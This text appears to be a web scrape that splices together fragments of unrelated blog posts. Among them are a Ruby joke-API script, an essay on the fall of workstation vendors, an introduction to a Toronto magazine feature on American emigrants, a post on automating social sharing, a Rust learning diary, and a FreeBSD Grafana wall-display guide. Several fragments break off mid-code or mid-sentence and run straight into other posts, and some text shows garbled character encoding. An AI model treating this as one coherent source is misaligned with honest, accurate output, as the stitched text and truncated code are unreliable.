<p>If the <code>type</code> attribute from the response equals <code>success</code>, we can render jokes. Otherwise, something went wrong, and it won't be funny. We should have in mind that the format of the response is different depending on the number of jokes we request.</p>
<p>When one joke is requested, the joke is available as a hash. When multiple jokes are requested, the response contains an array of jokes:</p>
<div><pre><code><span>require</span> <span>'net/http'</span>
<span>require</span> <span>'json'</span>

<span>response</span> <span>=</span> <span>Net</span><span>::</span><span>HTTP</span><span>.</span><span>get_response</span><span>(</span><span>uri</span><span>).</span><span>body</span>
<span>parsed_response</span> <span>=</span> <span>JSON</span><span>.</span><span>load</span><span>(</span><span>response</span><span>)</span>

<span>if</span> <span>parsed_response</span><span>[</span><span>'type'</span><span>]</span> <span>==</span> <span>'success'</span>
  <span>value</span> <span>=</span> <span>parsed_response</span><span>[</span><span>'value'</span><span>]</span>
  <span>value</span> <span>=</span> <span>[</span><span>value</span><span>]</span> <span>if</span> <span>value</span><span>.</span><span>is_a?</span><span>(</span><span>Hash</span><span>)</span>

  <span>value</span><span>.</span><span>each_with_index</span> <span>do</span> <span>|</span><span>joke</span><span>,</span> <span>index</span><span>|</span>
    <span>puts</span> <span>''</span>
    <span>puts</span> <span>"Joke #</span><span>#{</span><span>index</span> <span>+</span> <span>1</span><span>}</span><span>: </span><span>#{</span><span>joke</span><span>[</span><span>'joke'</span><span>]</span><span>}</span><span>"</span>
  <span>end</span>
  <span>puts</span> <span>''</span>
<span>else</span>
  <span>puts</span> <span>'Something went wrong, please try again'</span>
<span>end</span>
</code></pre></div>
<p>We can now put all parts into one and test it:</p>
<div><pre><code><span>#!/usr/bin/env ruby</span>

<p>let's have some more fun with a custom name:</p>

		<p>Last month’s news that <a href="https://arstechnica.com/information-technology/2020/10/ibm-to-split-into-two-companies-by-the-end-of-2021/">IBM would do a Hewlett-Packard</a> and divide into two—an IT consultancy and a buzzword compliance unit—marks the end of “business as usual” for yet another of the great workstation companies.</p>
<p>A quick aside on computing history. You can imagine personal computing being driven by two distinct schools of thought. The “top down” school, represented by research-led organisations including Xerox PARC, Bell Labs,academia and the military, asked “what would the world be like if everyone had their own minicomputer”? They took large, time-sharing systems like UNIX and installed them first under, then on, employees’ desks for their own personal use.</p>
<p>The “bottom up” school was made up of hobbyists who asked “can we make an interesting computer out of inexpensive components”? Thus companies like Apple and MITS in the US, Acorn and Sinclair Radionics in the UK, and others took chips that were usually used as peripherals controllers in “real” computers and built interactive programming systems around them. The microcomputer revolution came from the bottom-up school, as they made home computing affordable. The workstation revolution came from the top-down school, as they made powerful on-demand computing feasible.</p>
<p>The two schools came into very close proximity in the 1980s, when the Motorola 68000 family of CPUs (along with the 68881/68882 FPU and 68851 MMU) were the processors of choice in everything from entry-level PCs like the Atari 520ST, through games consoles like the Sega Mega Drive (Genesis in the US), to the most expensive UNIX workstations from NeXT Computer, Sun Microsystems, and Apollo Computer.</p>
<p>But then the workstation makers invested heavily in their own CPU architectures based on RISC design principles and again the two diverged. The workstation market became highly differentiated: RS/6000 from IBM (later PowerPC), Alpha from Digital Equipment Corp, MIPS from, well, MIPS, SPARC from Sun, PA-RISC from HP. The software on these workstations, while superficially very similar, was also differentiated and surprisingly incompatible. Take a program from HP-UX and you’ll have difficulty running it on NeXTSTEP, unless the authors shared the source code and used the nascent GNU autotools to support portable building. As Yoda said: begun, the <a href="https://www.livinginternet.com/i/iw_unix_war.htm">UNIX wars</a> have.</p>
<p>Of course we know that the (desktop) computing world today is mostly Intel and that workstations are mostly fancy PCs, rather than bespoke designs by vertically-integrated companies, Apple being the two trillion dollar outlier. How we got here was that the commodity parts got good enough that there was no evident advantage to workstation-grade hardware. A high-end PC could easily run a workstation OS like System V UNIX (Solaris was an early example), BSD (386BSD which later became FreeBSD, or NeXTSTEP) or Windows NT.</p>
<p>Along the way, the workstation companies consolidated (Apollo and eventually DEC got absorbed into HP; MIPS into SGI) or disappeared altogether (Sun became Oracle Hardware; SGI went bankrupt and sold its assets to sgi; Symbolics did similar—incidentally Symbolics was the first company with a .com domain). IBM long ago stopped even making its own brand PCs, and the news of its split means that there are now very few workstation companies trading in the same form they had “back in the day”. The only ones I can think of that have not had major changes to their corporate structures are Xerox and Sony, whose management may not even have known that they sold workstations.</p>
<p>What’s got lost alongside the death of the workstation is the business model where you sell expensive computers as part of an integrated solution into a particular vertical market, where that expensive solution will cost a lot less than cobbling something together out of cheap PCs. Why? I think people have a lower expectation and higher pain threshold when using computers now; they expect an amount of friction based on their own experience and translate that expectation into realms where it doesn’t belong. As I described way back in issue 2, <a href="https://deprogrammaticaipsum.com/the-various-meanings-of-quality/" target="_blank" rel="noopener noreferrer">computing is a lemon market</a>.</p>
<p>Organisations would go to the workstation vendors because they solved particular problems very well. If you’re in AI, you need Symbolics. Computer graphics, SGI. Telecoms, that’d be Sun. If you want to write software in Ada for the military-industrial complex, you’ll be buying a Rational workstation. Yes, the first IDE was a completely integrated package of hardware and software. And, of course, Apple for Desktop Publishing, the Mac being a workstation of sorts itself. People would buy computers <em>because</em> applications like AutoCAD, Quark or Mathematica ran well on them. They wouldn’t buy the computer then browse the App Store to see whether it could do anything useful.</p>
<p>And the strange thing is that catering to those vertical markets with integrated solutions is easier than ever now. The wide availability of free software means that the basic job of “being a desktop computer” is taken care of at zero cost, so business can focus on contributing valuable bespoke behaviour. And hardware costs are lower than ever: the availability of high-capability SoCs and single-board computers like the Raspberry Pi and Rock64 should make it a no-brainer to sell the computers as accessories for the applications, not the other way around.</p>
<p>In high-tech domains, an engineer could readily have a toolchest of suitable computers in the same way that a mechanic has different tools for their tasks. This one has an FPGA connected by both PCI-E and JTAG to allow for quick hardware prototyping. This one is connected to a high-throughput GPU for visualisations; that one to a high-capacity GPU for scientific simulations.</p>
<p>The general purpose hardware vendors want us to believe that an okay-at-anything computer is the best for everything: you don’t need a truck, so here’s a car. But when you’re hauling a ton of goods, you’ll find it cheaper and more satisfying to shell out more for a truck. Okay-at-anything is good for nothing.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-yui_3_17_2_1_1604014894134_5806"><div><h2>Introduction</h2><p>Back when I used to DJ at CIUT, there was a board operator, John, who wore an old Tigers baseball cap. (This is such ancient history that, in the late 1980s, campus announcers had board operators. Also: The Tigers were still good enough to give people a reason to wear their cap). Once, over a discussion of baseball, John told me he loved the game, but hated watching it.</p><p>“On television?” I asked. “It’s true that some find it very slow.”</p><p>“No, television’s fine,” he said. “It’s the games I find troubling. Actually, it’s the time before the game that’s most troubling.”</p><p>I found this perplexing until he told me why he was troubled: John refused to stand for “The Star-Spangled Banner.”</p><p>“I left the States during Vietnam,” he said. “I won’t honour the anthem. It makes me angry every time I hear it.”</p><p>“What do people think?” I asked him. “What do people think when you don’t stand?”</p><p>“Most of them look at me like there’s something wrong with me physically. But then I get up for ‘O Canada.’ Most people don’t say anything,” he said. “But, every now and then...,” he added, leaving the thought unfinished.</p><p>I’ve been thinking about John’s story now, as I’ve watched the protest movement across professional sports, sparked by another man, Colin Kaepernick, who wouldn’t stand either. And I started to recognize the Americans among us. Back in the ’80s, the lion’s share of Americans in Canada had come over the border into Ontario as objectors to the Vietnam War. In 2020, it’s a different demographic, and we wondered what motivated them to come. Following Trump’s inauguration, American emigration surged and has stayed high throughout his term. With the American election approaching, we reached into the West End, and across the city, to tell stories of how the Americans ended up here and why, and how they feel as their country lurches at the crossroads.</p><p>—DAVE BIDINI</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604018078061_32146"><div><h2><a href="https://www.westendphoenix.com/americans/maureen-honore">Maureen Honore</a></h2><h3>“We don’t talk much about the future because we can’t; we need to survive right now”</h3></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604018078061_60277"><div><h2><a href="https://www.westendphoenix.com/americans/tyler-clark-burke">Tyler Clark Burke</a></h2><h3>“I still seem to connect immediately with other Americans whenever we find each other in a crowd”</h3></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604018078061_69739"><div><h2><a href="https://www.westendphoenix.com/americans/richard-berman">Richard Berman</a></h2><h3>“I remember with absolute clarity the instant when I realized that this was the place for me”</h3></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604018078061_90784"><div><h2><a href="https://www.westendphoenix.com/americans/bill-king">Bill King</a></h2><h3>“We packed up and hitchhiked to Canada”</h3></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604018078061_127695"><div><h2><a href="https://www.westendphoenix.com/americans/valerie-hunter">Valerie Hunter</a></h2><h3>“We seem to end up nervously sighing and shaking our heads without verbalizing our collective sense of dread”</h3></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604018078061_165349"><div><h2><a href="https://www.westendphoenix.com/americans/brad-wheeler">Brad Wheeler</a></h2><h3>“The cheeseburger and the banquet-cut fries tasted exactly as I remembered them”</h3></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604018078061_175780"><div><h2><a href="https://www.westendphoenix.com/americans/tim-ellis">Tim Ellis</a></h2><h3>“I left the military, got into raving and became a DJ”</h3></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604018078061_185261"><div><h2><a href="https://www.westendphoenix.com/americans/jessica-todd-long">Jessica Todd Long</a></h2><h3>“Even if he wins and Trump leaves peacefully, the country is very divided.

    <p>In a quest to spend more time writing and less time sharing online what I write, I developed an automated workflow to share my posts on social media with minimal effort.</p>
<p>What used to take me up to ninety minutes per week happens now automatically.</p>
<p>I can focus on sketching and writing while the machine takes care of formerly-manual labor.</p>
<hr>
<p>I sketch and write daily, pairing up my sketches and essays as little stories. I have to manually scan and edit my drawings, as well as polish my writing drafts and translate them into Spanish. I then upload the sketch and story to my website and schedule them for publication.</p>
<p>On the publication date, a series of automated events take place.</p>
<p>Let's see what those are.</p>
<hr>
<p>First, the story shows up on my RSS feed — a standardized system to distribute content online so users and applications can receive updates — which contains all my publications. The story also appears on the main page of my website, at&nbsp;<a target="_blank" href="http://nono.ma/">Nono.MA</a>, and on my sketches page,&nbsp;<a target="_blank" href="https://sketch.nono.ma/">Sketch.Nono.MA</a>.</p>
<p>In the early morning of the scheduled date, a Mailchimp newsletter campaign reads my RSS feed and sends the Spanish version via email to Spanish subscribers. Later that day, early morning in the United States, another newsletter campaign emails the original English story. (The one you're reading now.)</p>
<p>The same feed is read by Zapier, an online service I've configured to share my weekly sketch and story on multiple social media accounts, including Facebook, Twitter, Tumblr, LinkedIn, and Instagram.</p>
<p>The post is shared on two Facebook pages, two Twitter accounts, two Instagram accounts, one Tumblr account, and my personal LinkedIn profile, and scheduled to be re-shared on Twitter on Friday, two weeks later, using Buffer. An image-processing and optimization service called Imgix resizes my sketch's canvas to be shared as a square image on Instagram.</p>
<p>Two optional manual steps make this process feel a bit more human: sharing on Hacker News, something I might not want to do every week, and sharing on my Facebook timeline. (Neither Hacker News nor Facebook's API let you automate this step.)</p>
<hr>
<p>Sharing each story used to steal ten to ninety minutes of my time.</p>
<p>Now my job is to supervise the pipeline works and make little adjustments here and there.</p>
<p>I can focus on sketching and writing.</p>

In addition to constant attacks on IT assets there is growing legal pressure to deliver and maintain regulatory guidelines in our networked world. Requirements such as PCI-DSS, HIPAA, GDPR or SOC2 are becoming the pre-requisite of any operation in various industries.</p><p>Modern cloud native architectures and Kubernetes provide tools to address these demands, but the knowledge of these tools and methods are not widely understood.

              <p>How many times you've said to yourself "we cannot implement this or that feature"?. Or "there is no need to use this or that" or asked yourself if it was possible to achieve a project or part of it?</p>

<p>At a given point our limitations or/and our skills influence how we handle projects. It's always a present phenomenon that is, in most cases, neglected and mistaken.</p>

<p>Developers and designers will tend to only approve or support ideas that they know they can handle. The project manager will push the team to their nightmare zones. Then the project owner might go further or fold to a little possibility because he/she has no idea that those things can be achieved or even exist.</p>

<p>Knowing a technology means also knowing its limitations, you will tend to instinctively avoid or reject to implement certain ideas or solutions. It happens naturally. Sometimes it interprets as a self-satisfactory stage. You just feel it as in <em>I think it's OK</em>. Yes, I know we should avoid falling into the <a href="https://phpocean.com/blog/article/the-designer-s-fever-of-beautification-and-its-traps/63">loop of perfection</a>. But it's crucial for advancement. from time to time we must ask ourselves if that's the only limit.</p>

<p>So, someone with fewer skills in tech would be pushed to think of only expected results without thinking of the pain poured on the technicians. They would see it as I just want it like this and that. Not knowing how things are done gives them the courage and peace of mind to express themselves to the extreme. Hence, they will usually have that feeling of dissatisfaction. Or, the fact that they have less knowledge about it will turn them speechless. That leaves room for the technicians to suggest to them what can be done or not. And that could have an opposite impact which is to do what the technicians see and not what the project owner sees.</p>

<p>In all cases, these behaviors affect how we undertake projects. My goal in this post is to call your attention to such psycho-antagonism in teams. Get the habit to check where you and others stand. Then throw the pride and shame away to admit to what is necessary and viable for the project's success.</p>

November 2, 2020 | https://levpaul.com/posts/rust-lesson-3-and-4/ | <a href="https://web.archive.org/web/*/https://levpaul.com/posts/rust-lesson-3-and-4/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>Hello and welcome to the third post in my series about learning Rust. In case you want to hit it from the start, <a href="https://levpaul.com/posts/rust-lesson-1/">here’s</a> a link to the first one! This entire series covers my journey from being a completely land-locked Gopher to becoming (hopefully) a hardened Rustacean, able to skitter the hazardous seabed of any application safely.</p><p><em>Warning: Incoming opinion monologue; feel free to skip to <a href="#give-me-the-lessons">The Lesson Review</a> review if that’s what you’re after</em></p><h4 id="how-rust-is-makin-me-feel">How Rust is Makin' Me Feel</h4><p>Let me begin not by thwacking loosely about in concepts I know little yet of, as there’s plenty of time for that, but instead allow me to paint the landscapes I see for both Rust and Go. At quite the visceral it occurred to me that these modern languages are built not just to make our coding lives more delightful - but instead to shepherd us into particular engineering and organizational goals.</p><p>The needs for new general purpose languages no longer stem from the “simple” software problems. Take the problems of using variables (Assembly), using custom data types (C), cross-platform, cross-architecture compatibility (JVM languages) or even being dead simple (Python). Today’s languages can instead choose features from all the preceding and <em>then</em> apply engineering and organizational direction.</p><h4 id="the-coercion-of-go">The Coercion of Go</h4><p>I’ve been writing in Go as a hobby since 2014 but professionally only since 2018. As a hobbyist I’ll admit I used to think “Go is <em>opinionated</em>”. That seemed cool, because opinions mean something! Right? But <em>why</em> was it opinionated Levi, WHY? WAKE UP MAN!</p><p>Well today I have a completely different look on it. Go is simply a language that is very <em>safe</em> to share across engineers. This is because engineers don’t need to make a lot of decisions when they use Go. If an application has had its design completed in theory then in Go it often really is just a matter of whacking out the code to make it a reality.</p><p>Just look at how much of Go’s development tooling Google owns. With Java, I remember choosing between Ant or Maven for your build tooling. Go doesn’t let you chose. The closest we got to having a choice was with <code>dep</code> for dependency management. But finally Google caved and <code>gomod</code> was brought about as the standard. Go does its best to take choices away from you. You don’t need to chose between Tomcat or Jetty - the Go <code>net/http</code> package will handle 10kRPS for you no problem. Hell I’ve looked at apps serving 50kRPS, whilst <em>logging</em> a third of said requests simply using <code>fmt.Println</code>. You just don’t need to stray far from the standard library to scale and that is a huge plus of the language. (A large part of this is also comes from the fact that webservers haven’t changed a heck of a lot in the past 10 years so Go didn’t have to “keep up” - on the other hand my experience with http2 in Go has been far from ideal).</p><h5 id="_anyone_-can-pick-up-your-code-and-fix-it"><em>Anyone</em> can pick up your code and fix it</h5><p>This is by far the biggest selling point of using Go <em>in a company</em>. If you need to hire help you can find basically <em>anyone</em> with backend experience, and they will pick up 90% of Go in a week or two. You don’t need to worry at all if they have experience with Struts, JUnit or Spring - what’s in the standard library is plenty. I mean it. Do they need to know about passing pointers or values? Not really - general software engineering practices like peer review and simple unit testing will uncover those types of issues with ease.</p><p>Now on the other hand - who in their right mind would hire <em>me</em> to join their Rust team right now? Nobody - because I would be a gigantic liability to that team.</p><h5 id="gos-purpose-is-for-dev-shops-to-crank-out-web-services-that-are-scalable-easy-to-develop-and-do-not-require-mission-critical-performance">Go’s purpose is for dev shops to crank out web services that are scalable, easy to develop and do not require mission critical performance.</h5><h4 id="rust-no-rust">Rust no Rust</h4><p>I’m a noob. 100%. But even so, in my feeble mind I can already see what Rust is. I see a very sharp knife; but this knife is completely and utterly shrouded and encased in tamper-proof, child-proof, thief-proof hardened and sealed plastic shells. Yes shells as in the plural of shell. These shells are even adult-proof too, where the adult is a generic engineer trained generally in other languages only. The compiler is the packaging, and it will let you wield the knife when it knows exactly what your action plan is. -But oh no, not just any plan will do, your plan <em>must</em> adhere to each and every rule and regulation from the Knife Safety Measurement Act of 1938 and its associated amendments!! (This may not be strictly true as I’ve heard about an <code>unsafe</code> keyword).</p><p><em>But why so much plastic broseidon?</em> You know, and I know that it’s to keep mild-minded people like myself exactly, from nicking fingers with that very sharp knife. Warping back to a meta-level, those fingers don’t even necessarily belong to me the coder, but to the end users of the code. It is no secret to anybody even slightly interested in Rust that a major driving factor for the language was to be able to replace C++ code with something <em>as</em> efficient but much less susceptible to security exploits. Thus, the safety plastic aims not to protect individual coders, but the <em>coding organization</em>.</p><p>Okay, you’ve probably heard enough of my opinion, let’s move on before this analogy implodes and actually hurts someone.</p><hr><h2 id="give-me-the-lessons">Give Me The Lessons!</h2><h4 id="3-common-programming-conceptshttpsdocrust-langorgbookch03-00-common-programming-conceptshtml">3. <a href="https://doc.rust-lang.org/book/ch03-00-common-programming-concepts.html">Common Programming Concepts</a></h4><p>One of the first ‘huh’ moments in this lesson was this compiler message:</p><div><pre><code data-lang="rust"><span>compiler</span><span> </span><span>error</span>:
<span>For</span><span> </span><span>more</span><span> </span><span>information</span><span> </span><span>about</span><span> </span><span>this</span><span> </span><span>error</span><span>,</span><span> </span><span>try</span><span> </span><span>`</span><span>rustc</span><span> </span><span>--</span><span>explain</span><span> </span><span>E0384</span><span>`</span><span>.</span><span>
</span></code></pre></div><p>Naturally I ran the command listed, which took me to a <code>less</code> window (buffer?) containing the following:</p><div><pre><code data-lang="fallback">An immutable variable was reassigned.
Erroneous code example:
'''
fn main() {
    let x = 3;
    x = 5; // error, reassignment of immutable variable
}
'''
By default, variables in Rust are immutable. To fix this error, add the keyword
`mut` after the keyword `let` when declaring the variable. For example:
'''
fn main() {
    let mut x = 3;
    x = 5;
}
'''
</code></pre></div><p>…and this slightly let me down. There isn’t a whole lot of information in this “explanation”. I proceeded to allow <code>rustc</code> to “explain” some more random error codes to me, most of them seemed also to be quite small or to have been deprecated. I am hoping either A) I don’t have to use this feature much or B) I can make rustc/cargo/intellij just tell me the detailed stuff by default.</p><hr><div><pre><code data-lang="rust"><span>const</span><span> </span><span>MAX_POINTS</span>: <span>u32</span> <span>=</span><span> </span><span>100_000</span><span>;</span><span> </span><span>// wtf is this ugly numeric shit
</span></code></pre></div><p>For some reason this irked me when I first saw it (the comment taken verbatim from my lesson notes). On second look it actually seems really, really helpful for readability.</p><hr><h4 id="shadowinghttpsdocrust-langorgbookch03-01-variables-and-mutabilityhtmlshadowing"><a href="https://doc.rust-lang.org/book/ch03-01-variables-and-mutability.html#shadowing">Shadowing</a></h4><p>This seems like a really handy trick. You get to write code as if your variable was immutable, but the compiler does the switching for you. What is really messing my head up though is that you learn about Shadowing before you learn about Ownership. So does my naive understanding of shadowing change after this? I don’t think so … at least. Here’s something I wrote to verify my learnings:</p><div><pre><code data-lang="rust"><span>fn</span> <span>main</span><span>()</span><span> </span><span>{</span><span>
</span><span>    </span><span>let</span><span> </span><span>mut</span><span> </span><span>s</span><span> </span><span>=</span><span> </span><span>String</span>::<span>from</span><span>(</span><span>"hello"</span><span>);</span><span>
</span><span>    </span><span>let</span><span> </span><span>r1</span><span> </span><span>=</span><span> </span><span>&amp;</span><span>mut</span><span> </span><span>s</span><span>;</span><span>
</span><span>    </span><span>let</span><span> </span><span>r1</span><span> </span><span>=</span><span> </span><span>&amp;</span><span>mut</span><span> </span><span>s</span><span>;</span><span>
</span><span>    </span><span>println</span><span>!</span><span>(</span><span>"{}"</span><span>,</span><span> </span><span>r1</span><span>);</span><span>
</span><span></span><span>}</span><span>
</span></code></pre></div><p>…and it works. It also answers a question I had when originally learning ownership. For some reason when reading the examples in the book I came away thinking Rust could infer when immutable references' scopes end, but not mutable ones. I was puzzled by this and had a follow-up item but this little example proves I was wrong. Happy days!</p><hr><h5 id="small-nit">Small Nit?</h5><p>The <a href="https://doc.rust-lang.org/book/ch03-02-data-types.html#invalid-array-element-access">Invalid array element access example</a> didn’t work - it was supposed to produce a runtime error but instead it failed to compile:</p><div><pre><code data-lang="rust"><span>   </span><span>Compiling</span><span> </span><span>variables</span><span> </span><span>v0</span><span>.</span><span>1.0</span><span> </span><span>(</span><span>/</span><span>home</span><span>/</span><span>levi</span><span>/</span><span>rustprojs</span><span>/</span><span>variables</span><span>)</span><span>

Maybe white-belt, double-yellow-tip or something along those lines… “<em>Let’s go for a wander</em>” I thought to myself with quiet confidence. Looking left, and then looking right, under the shelter of a single raised eye-brow I chose to descend toward the belly of Rust.</p><p><em><strong><code>Ctrl + *click*</code></strong></em></p><p>I chose a simple avenue.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


			
<p>Let me say it again â€“ Software development is about being effective and efficient.</p>



<p>Browsing twitter and other social media I often see how technology is preferred just because is â€œsexyâ€�. It is new and â€œcoolâ€�.</p>



<p>You have to remember that programming languages and platforms are <strong>just tools</strong>. If you need a hammer you should not use a screwdriver, no matter how new and fancy it is the screwdriver.</p>



<h2>Some bad examples of software development</h2>



<p>During <a aria-label="undefined (opens in a new tab)" href="https://ddimitrov.dev/about/" target="_blank" rel="noreferrer noopener">my career</a>, I have seen how projects fail because of the wrong tool usage. Real example â€“ a very simple CRUD application but implemented with Event Sourcing and CQRS. Why? Because it was â€œcoolâ€�. Did the requirements need such an implementation? No. The customer just wanted several tables with related data. When the customer had asked for improvements and expansion of the system the development team decided to start from scratch with a new approach just because the current architecture was not cost-effective for the desired expansion.</p>



<p>Another great example. Back in the days when Silverlight (anybody remembers <a href="https://en.wikipedia.org/wiki/Microsoft_Silverlight" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">Silverlight</a>?) came out a company whose tech lead I know personally, decided to adopt the technology for their new ERP System UI. It was a very risky call. The technology was new and it had not been tested intensively on the real market. Nobody knew back then that Silverlight would be discarded as an unwanted child several years later. But it was â€œcoolâ€�â€¦</p>



<p>History knows many bad examples. The question is â€“ do we learn from them?</p>



<p>In software development, everything is about a trade-off. You trade speed for availability, complexity for flexibility, etc. When the trade-off is not about quality attributes but your personal preferences and desires then you are going to have a problem.</p>



<p>Anytime you choose a course of action you should ask yourself â€œWhat I win? What I lose?â€�. If I choose the new fancy JS library will it be on the market next 5 years? If I have to process large amounts of textual data which is better Java or Python? Of course, answers may vary and thatâ€™s normal.</p>



<p>If you want to be cool, use the proper tools, and complete the project on time and budget. There is nothing cooler than that ðŸ˜Š.</p>

                    <p>I've recently added a wall mounted 30" monitor for Grafana in my home. I can highly recommend doing the same, especially in a world where more work from home is becoming the norm.</p>

<p>Having metrics visible at all times can be incredibly helpful in spotting trends and issues. This is the reason we all have wall mounted Grafanas in our workplaces! Since we are all going to be working from home for the foreseeable future it makes sense to have visible metrics at home as well. Also, much of the stuff I need metrics for is not work related at all - <a href="https://blog.uncensoreddns.org/">UncensoredDNS</a> for example, the <a href="https://bornhack.dk/bornhack-2020/">BornHack</a> infrastructure, and so on. I see no reason why projects run outside of $dayjob should receive any less attention, such as visualisation of metrics.</p>

<p>Sometime before summer I physically mounted the screen using <a href="https://vivo-us.com/collections/monitor-mounts/products/stand-v002l">this very nice</a> over/under 2 monitor stand, and then started considering which computer to use for it. Ideally something I already had lying around, and of course something with enough power to run some Grafana dashboards without choking.</p>

<p>Not for a moment had I anticipated that actually displaying the graphs in a browser that doesn't crash constantly would be the most time-consuming part of getting this up and running. I mean, I've spent hours playing with various Prometheus exporters for all the different servers I run (and Ansible roles for them). I've also spent hours fiddling with Grafana dashboards until they show the level of information I like. Both of these are complex jobs and and I am absolutely fine with spending time on them. But when I finally had nice working dashboards in my Firefox browser on my laptop I fully expected it to be trivial to put those on a monitor on the wall. It was not. This tale is left here for future metrics aficionados in the hopes that you will spend less time on this dreary task than I did.</p>

<p>I've documented the failed attempts as well as the final well-working solution. Feel free to skip over the first two sections if you are just here to learn what works :)</p>

<h3>First Attempt: ODROID-C2 with Ubuntu</h3>
<p>Originally I wanted to use an <a href="https://wiki.odroid.com/odroid-c2/odroid-c2">ODROID C2</a> which I had lying around because I used it as a mediacenter with <code>Kodi</code> provided by <code>Liberelec</code> previously. This seemed like a good choice, I mean if it can show a 1080p video without choking it should be able to render a few <code>Grafana</code> dashboards, right?</p>

<p>The <code>ODROID-C2</code> is an <code>Amlogic S905</code> SOC with a <code>Cortex A53</code> ARMv8 64bit CPU. It has 4 cores and 2GB RAM. It supports <code>eMMC</code> storage which is a nice and faster alternative to the SD cards used by many of the "Raspberry PI-sized" computers that exists today.</p>

<p>I tried to figure out wether it was possible to run <code>FreeBSD</code> on it, but the <a href="https://www.freebsd.org/platforms/arm.html">ARM Wiki page</a> seems to say that 64bit ARM support is still being worked on. I thought it was too much to hope for anyway.</p>

<p>Then I tried to go for a stock Debian, but that didn't boot at all. Turns out I need to use either the <a href="https://wiki.odroid.com/odroid-c2/os_images/ubuntu/ubuntu">Ubuntu</a> image provided by the ODROID people, or a <a href="https://wiki.odroid.com/odroid-c2/os_images/third_party">third party</a> OS image.</p>

<p>Once I got Ubuntu up and running and found a Firefox browser it quickly became apparent that it would not work. The browser kept freezing up, or crashing, or both. I tried using Chromium which annoyingly worked a bit better. It was not stable, but it would run for half a day or maybe a day and then stop working somehow. And this was with just one dashboard, If I opened another tab with another Grafana dashboard it made matters worse.</p>

<p>It wasn't immediately clear what the problem was, in hindsight it was probably RAM, but either way I decided to try something else.</p>

<h3>Second Attempt: Raspberry PI 3b+ with Raspbian</h3>
<p>I had an RPI3b lying around and decided to try that instead. I am not a big fan of the RPI platform in general, I've had way too many weird issues over the years, I guess I just prefer a more normal computer. But I needed something to show my graphs, so I launched <a href="https://www.raspberrypi.org/downloads/noobs/">NOOBS</a> and asked it to install <code>Rasbbian</code> and I was pretty soon up and running with graphs on my wall again.</p>

<p>The Raspberry PI 3b+ has a full 1GB of RAM, much more than previous PIs, but only half of what the <code>ODROID-C2</code> has. It still performed about the same as the <code>ODROID-C2</code>. It didn't work at all with Firefox, with Chromium it was okay with a single tab or two, but after 12-24 hours it would stop working. Sometimes it would be an "unresponsive tab" error from the browser, and sometimes the whole OS would freeze up completely.</p>

<p>Around this time the annual <a href="https://bornhack.dk/bornhack-2020/">BornHack</a> was approaching, so my attention was needed elsewhere. I made due with the unstable PI for a couple of months - daily reboot helped a little, but it isn't exactly a nice solution.</p>

<h3>Third Time is the Charm: A NUC with FreeBSD</h3>
<p>So last week I finally got around to taking another whack it. No more beating around the bush, I was going to buy something with enough power, and then some. I started looking around and soon found that a Danish shop with pickup service had an Intel <code>NUC8I7BEH</code> in stock. While physically larger than the Raspberry PI and ODROID-C2 (it is just under 12x12cm long and wide, and just under 6cm tall, including the VESA mount), it is still a pretty small computer.</p>

<p>I picked it up around along with 2 sticks of <code>Kingston 16GB DDR4 2400MHz SODIMM</code> non-ECC RAM, (the NUCs are delivered as a "kit" without RAM and storage) and a <code>Samsung 870 QVO MZ-77Q1T0BW</code> 1TB SATA SSD. Assembling it was really easy, four screws and and a couple of minutes later the RAM and SSD were in, and the NUC POST revealed it found all 32GB RAM and also the SSD. It refused to boot from the FreeBSD installer USB stick though. This was because secure boot was enabled in the BIOS. After disabling it the FreeBSD install was absolutely standard, no issues at all.</p>

<p>This was in the beginning of October 2020 so the latest <code>12-STABLE</code> was something like <code>12.2-BETA3</code> or so, it doesn't really matter since I upgrade to latest <code>12-STABLE</code> after installing anyway. As always I used the auto-ZFS option in the installer so I can use <code>bectl</code> to make nice boot environments for easy rollbacks in case of problems when upgrading.</p>

<p>A quick <code>pkg install xorg slim fluxbox firefox</code> and a bit of fiddling later I was looking at a very smoothly running Grafana dashboard in X. The rest of this blogpost is about the configuration of FreeBSD, X, Slim, Fluxbox and Firefox for an ideal wall-mounted Grafana screen. Much of this is done in Ansible, but not all of it. I've documented everything here for the sake of completeness, but a lot of basic configuration is done by my Ansible roles, and is not that relevant for this blogpost. Stuff like configuring syslog, monitoring, SSH keys and all the other sysadminy stuff that all machines need. This blogpost just focuses on what to do to go from a fresh FreeBSD machine to a well oiled Grafana wall display.</p>

<p>Finally: I realize that comparing a NUC to a Raspberry PI is not even close to a fair comparison, for starters the NUC is ten times more expensive. It has a powerful <code>CPU: Intel(R) Core(TM) i7-8559U CPU @ 2.70GHz (2712.12-MHz K8-class CPU)</code> and 32GB memory, so obviously it is going to perform a lot better. But overkill was the whole point of this exercise! I  had spent <i>far</i> too much time faffing about with insufficient hardware and at this point I was perfectly happy to throw money at the problem until it went away. YMMV.</p>

<h3>Dedicated User</h3>
<p>First off I added a dedicated user to show the graphs, since I intend to enable autologin for this setup. This user is not going to have <code>wheel</code> or <code>sudo</code> access, it really only has to be able to start X and Firefox. I also have another user with my regular SSH key which I used for debugging and whatever else is needed (rarely sysadm stuff though, since that is handled by Ansible).</p>


<h3>X Configuration</h3>
<p>On modern FreeBSD X mostly configures itself, but the <code>i7-8559U</code> inside the <code>NUC8i7BEH</code> is a Gen9 Intel Coffee Lake CPU, the integrated <code>Iris Plus Graphics 655</code> GPU inside it is too new to be supported by the <code>i915kms</code> module in FreeBSD base. This is the output from <code>pciconf -lv</code> concerning the GPU:</p>

<pre>vgapci0@pci0:0:2:0:     class=0x030000 card=0x20748086 chip=0x3ea58086 rev=0x01 hdr=0x00
    vendor     = 'Intel Corporation'
    device     = 'Iris Plus Graphics 655'
    class      = display
    subclass   = VGA
</pre>

